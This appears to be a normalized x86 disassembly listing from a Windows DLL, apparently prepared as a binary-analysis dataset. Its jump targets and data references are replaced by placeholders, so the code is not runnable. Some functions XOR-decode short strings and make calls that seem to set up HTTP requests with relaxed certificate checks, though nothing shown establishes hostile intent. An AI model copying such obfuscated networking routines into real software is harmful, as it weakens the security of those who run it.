pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_100427ff
mov eax esi
sub_10049ef0
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax edx
sub eax [ ecx + 0x34 ]
push ebx
mov ebx [ ecx + 0xa4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0xa0 ]
add eax edx
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
jmp r-xdata
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
add esi edx
lea edx [ eax + 0x8 ]
sub ebx ecx
lea edi [ ecx - 0x8 ]
add eax ecx
xor ecx ecx
shr edi 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ebx
je r-xdata
test ebx ebx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ edx + ecx * 2 ]
and edx 0xfff
add [ edx + esi ] ebx
mov edx [ ebp - 0x8 ]
cmp [ edx + ecx * 2 ] 0x0
je r-xdata
mov ebx [ ebp - 0xc ]
sub_10049f71
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100476aa
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003bfa8
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_10006b0d
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_1004a031
mov edi edi
push esi
push edi
mov esi ecx
call sub_1002444c
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0x4 ]
push edi
call sub_1004ed30
push edi
call sub_10035d06
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_1004a063
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004215
add esp 0x14
pop ebp
retn 0x10
sub_1004a090
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_1004a100
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10001e8b
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x1
jne r-xdata
push 0x0
push eax
call sub_10052ab0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
mov eax 0x2
call sub_10029b50
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_1007f940
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10065cb8
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_10072800
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10065cb8
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x0
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_1004d020
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1004a330
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10026eb0
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_1004a4b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008930e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x138 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x150 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ esp + 0x2c ] eax
xor eax eax
mov [ ecx ] eax
mov [ esp + 0x20 ] ecx
push 0xffffffff
xor ecx ecx
mov [ esp + 0x2c ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ esp + 0x5c ] cx
push edx
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x74 ] 0x7
mov [ esp + 0x70 ] eax
call sub_100404a0
mov [ esp + 0x158 ] 0x0
cmp [ ebx + 0xb8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ esp + 0x3c ]
call sub_100704c0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x60 ]
mov [ esp + 0x164 ] 0x1
call sub_10017b50
mov [ esp + 0x158 ] 0x0
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ esp + 0x54 ]
push eax
call sub_100187af
add esp 0x4
lea edx [ esp + 0xd0 ]
mov eax 0x32
call sub_10072600
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
lea edx [ esp + 0xc4 ]
xor eax eax
call sub_10072600
lea edx [ esp + 0xe4 ]
mov eax 0xf
call sub_10072600
lea edx [ esp + 0xc4 ]
lea eax [ esp + 0xe4 ]
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] edi
mov ecx [ esp + 0x38 ]
push ecx
call sub_100187af
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x150 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x138 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
xor esi esi
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor edx edx
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov esi 0x1000
jmp r-xdata
neg eax
sbb eax eax
and eax 0x800000
or eax edx
push 0x0
or eax esi
or eax 0x84600900
push eax
mov eax [ esp + 0x1c ]
push 0x0
push 0x0
lea edx [ esp + 0xe0 ]
push edx
mov edx [ ebx + 0xd4 ]
push ecx
mov ecx [ ebx + 0xc4 ]
push eax
push ecx
call edx
mov edi eax
mov [ esp + 0x30 ] edi
test edi edi
jne r-xdata
lea ecx [ esp + 0x54 ]
mov edx 0x2000
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x3c ]
push eax
call sub_1005f2b0
push eax
mov edx r--data
lea esi [ esp + 0x7c ]
mov [ esp + 0x164 ] 0x2
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x104
mov [ esp + 0x158 ] 0x3
call sub_100205a0
mov esi 0x8
cmp [ esp + 0x84 ] esi
jb r-xdata
cmp [ esp + 0x68 ] 0x8
mov ecx [ esp + 0x54 ]
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ ebx + 0xe4 ]
push ecx
push 0x0
push edx
push edi
call eax
test eax eax
jne r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor edx edx
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] dx
cmp [ esp + 0x4c ] esi
jb r-xdata
mov ecx [ esp + 0x70 ]
push ecx
call sub_100187af
add esp 0x4
mov esi [ esp + 0x2c ]
mov ecx [ ebx + 0xdc ]
push 0x0
lea eax [ esp + 0x38 ]
push eax
push esi
push 0x20000013
push edi
mov [ esp + 0x48 ] 0x4
call ecx
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
lea ecx [ esp + 0xac ]
push ecx
call sub_1005f2b0
push eax
mov edx r--data
lea esi [ esp + 0x44 ]
mov [ esp + 0x164 ] 0x4
call sub_1005bbc0
add esp 0xc
push eax
mov edx r--data
lea esi [ esp + 0x90 ]
mov [ esp + 0x15c ] 0x5
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ esp + 0x54 ]
lea esi [ esp + 0x70 ]
mov [ esp + 0x158 ] 0x6
call sub_10038800
mov edx eax
mov ecx 0x104
mov [ esp + 0x158 ] 0x7
call sub_100205a0
mov esi 0x8
cmp [ esp + 0x84 ] esi
jb r-xdata
mov edx [ ebx + 0xcc ]
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push 0x1f
push edi
mov [ esp + 0x24 ] 0x100
call edx
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_100187af
add esp 0x4
cmp [ esi ] 0x12e
je r-xdata
call [ GetLastError@IAT ]
push eax
lea edx [ esp + 0x3c ]
push edx
call sub_1005f2b0
push eax
mov edx r--data
lea esi [ esp + 0xb4 ]
mov [ esp + 0x164 ] 0x8
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x104
mov [ esp + 0x158 ] 0x9
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ esp + 0x38 ]
mov [ esp + 0x158 ] 0x0
call sub_10019100
mov [ esp + 0x10 ] 0x3
jmp r-xdata
xor eax eax
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] ax
cmp [ esp + 0xa0 ] esi
jb r-xdata
mov edx [ esp + 0x70 ]
push edx
call sub_100187af
add esp 0x4
mov esi [ esp + 0x20 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebx + 0xd8 ]
push edi
call eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov esi [ esp + 0x28 ]
push edi
mov edi [ esp + 0x24 ]
call sub_1001e690
mov edi [ esp + 0x30 ]
mov [ esp + 0x10 ] eax
xor edx edx
mov [ esp + 0xa0 ] 0x7
mov [ esp + 0x9c ] 0x0
mov [ esp + 0x8c ] dx
cmp [ esp + 0x4c ] esi
jb r-xdata
mov ecx [ esp + 0x8c ]
push ecx
call sub_100187af
add esp 0x4
cmp [ esp + 0x68 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ esp + 0x28 ]
mov [ esi ] 0x0
mov [ ecx ] 0x0
xor ecx ecx
mov [ esp + 0x158 ] cl
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] cx
cmp [ esp + 0xbc ] esi
jb r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x54 ]
push edx
call sub_100187af
add esp 0x4
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov edx [ esp + 0xa8 ]
push edx
call sub_100187af
add esp 0x4
sub_1004a9f0
push ebp
mov ebp esp
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x90 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff0
and edx 0xff
mov [ ebp + eax * 2 - 0x50 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
push edx
mov [ ebp - 0x30 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0xfc ] 0x8
lea eax [ edi + 0xe8 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x2c ]
mov eax 0xf6
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_10053240
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x90 ]
push eax
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x90 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x1e
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x94 ] ebx
call sub_10053240
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x98 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x8c ]
mov eax 0x9f
call sub_10053240
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
mov edx [ ebp - 0x90 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x94 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xe9
call sub_10053240
mov [ ebp - 0x9c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x94 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x9c ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1004abc6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_1005ad64
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1005ad64
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1005ad64
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1005ad64
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002178c
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_1005ad64
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_1004adb0
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100362a0
mov [ esi + 0x4 ] 0x3
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f5d0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_1004ae43
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1001d099
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10007908
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_1004af30
push ebp
mov ebp esp
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx 0x3
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0xc4 ] esi
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc0 ] eax
lea edx [ eax + 0x1 ]
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xff85
and ebx 0xff
mov [ ebp + eax * 2 - 0x4c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ebx [ ebp - 0x1c ]
mov ecx [ esi + 0x1c ]
xor eax eax
mov [ ebp - 0x3e ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xbc ]
push eax
push r--data
lea eax [ ebp - 0x4c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xbc ]
jns r-xdata
lea edx [ ebp - 0xac ]
xor esi esi
mov [ ebp - 0xac ] esi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp eax esi
jge r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ebx [ VarBstrFromUI4@IAT ]
lea ecx [ ebp - 0xb8 ]
push ecx
push esi
push 0x80000000
push eax
mov [ ebp - 0xb8 ] esi
call ebx
cmp [ ebp - 0xb8 ] esi
jne r-xdata
lea edx [ ebp - 0x80 ]
lea eax [ esi + 0xe ]
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x60
call sub_10053240
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
mov eax 0xf8
call sub_10053240
mov ecx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb8 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ecx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb8 ] eax
call sub_10053240
mov edx [ ebp - 0xb8 ]
push edx
call [ SysFreeString@IAT ]
mov eax [ edi + 0x14 ]
lea ecx [ ebp - 0xb0 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb0 ] 0x0
call ebx
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x2b
call sub_10053240
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x30 ]
mov eax 0x23
call sub_10053240
mov ebx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x3c ]
mov eax 0x99
call sub_10053240
mov esi [ edi + 0x4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x3e
call sub_10053240
mov eax [ edi + 0x8 ]
lea ecx [ ebp - 0xb4 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xb4 ] 0x0
jne r-xdata
